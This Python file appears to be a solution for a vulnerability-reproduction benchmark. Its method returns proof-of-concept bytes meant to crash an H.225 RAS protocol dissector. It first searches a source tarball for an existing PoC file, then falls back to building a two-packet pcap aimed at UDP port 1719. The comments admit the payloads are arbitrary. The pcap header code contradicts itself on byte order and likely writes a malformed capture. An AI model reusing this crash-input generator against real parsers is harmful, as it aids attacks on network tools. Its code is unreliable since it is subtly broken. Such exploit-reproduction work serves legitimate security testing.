import os
import tarfile
import tempfile
import struct
import ipaddress


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        s += word
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def _ipv4_udp_packet(payload: bytes, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bytes:
    # IPv4 header
    version_ihl = 0x45
    dscp_ecn = 0
    total_length = 20 + 8 + len(payload)
    identification = 0
    flags_fragment = 0
    ttl = 64
    protocol = 17  # UDP
    header_checksum = 0
    src = int(ipaddress.IPv4Address(src_ip))
    dst = int(ipaddress.IPv4Address(dst_ip))

    ip_header = struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        dscp_ecn,
        total_length,
        identification,
        flags_fragment,
        ttl,
        protocol,
        header_checksum,
        src,
        dst
    )
    header_checksum = _checksum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        dscp_ecn,
        total_length,
        identification,
        flags_fragment,
        ttl,
        protocol,
        header_checksum,
        src,
        dst
    )

    # UDP header
    udp_length = 8 + len(payload)
    udp_checksum = 0

    udp_header = struct.pack("!HHHH", src_port, dst_port, udp_length, udp_checksum)
    # For UDP over IPv4, checksum can be zero (optional). Leave as zero.

    return ip_header + udp_header + payload


def _ethernet_frame(ip_packet: bytes) -> bytes:
    dst_mac = b"\x00\x11\x22\x33\x44\x55"
    src_mac = b"\x66\x77\x88\x99\xaa\xbb"
    eth_type = b"\x08\x00"  # IPv4
    return dst_mac + src_mac + eth_type + ip_packet


def _pcap_global_header() -> bytes:
    # Little-endian pcap
    magic_number = 0xA1B2C3D4  # Use big-endian magic to be widely recognized
    # But to ensure compatibility, use little-endian magic (0xd4c3b2a1)
    magic_number = 0xD4C3B2A1
    version_major = 2
    version_minor = 4
    thiszone = 0
    sigfigs = 0
    snaplen = 0x0000FFFF
    network = 1  # LINKTYPE_ETHERNET
    return struct.pack("<IHHIIII",
                       magic_number, version_major, version_minor,
                       thiszone, sigfigs, snaplen, network)


def _pcap_record_header(incl_len: int, orig_len: int) -> bytes:
    ts_sec = 0
    ts_usec = 0
    return struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find an existing small PoC in the tarball if available
        try:
            with tarfile.open(src_path, "r:*") as tf:
                # look for any file with size around 73 bytes that might be a PoC
                candidates = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    if any(ext in name_lower for ext in (".pcap", ".pcapng", ".cap", ".bin", ".dat", ".raw", "poc")):
                        candidates.append(m)
                # Prefer exact match of 73 bytes
                exact = [m for m in candidates if m.size == 73]
                if exact:
                    f = tf.extractfile(exact[0])
                    if f:
                        data = f.read()
                        if data:
                            return data
                # Otherwise, return the smallest candidate if any
                if candidates:
                    candidates.sort(key=lambda x: x.size)
                    f = tf.extractfile(candidates[0])
                    if f:
                        data = f.read()
                        if data:
                            return data
        except Exception:
            pass

        # Fallback: construct a PCAP with two UDP datagrams to H.225 RAS port (1719)
        # Payloads are crafted to engage the H.225 dissector with minimal content over two packets.
        # Using slightly varied payloads to ensure multiple dissections.
        # These payloads are arbitrary; the bug is triggered across packets in the dissector.
        payload1 = b"\x00\x01\xff\xee\x01\x00\x00\x00\x10\x20"
        payload2 = b"\x7f\x00\x00\x01\x02\x03\x04\x05\x06\x07"

        ip_pkt1 = _ipv4_udp_packet(payload1, "1.1.1.1", "2.2.2.2", 40000, 1719)
        ip_pkt2 = _ipv4_udp_packet(payload2, "1.1.1.2", "2.2.2.3", 40001, 1719)

        frame1 = _ethernet_frame(ip_pkt1)
        frame2 = _ethernet_frame(ip_pkt2)

        pcap = bytearray()
        pcap += _pcap_global_header()
        pcap += _pcap_record_header(len(frame1), len(frame1)) + frame1
        pcap += _pcap_record_header(len(frame2), len(frame2)) + frame2

        return bytes(pcap)
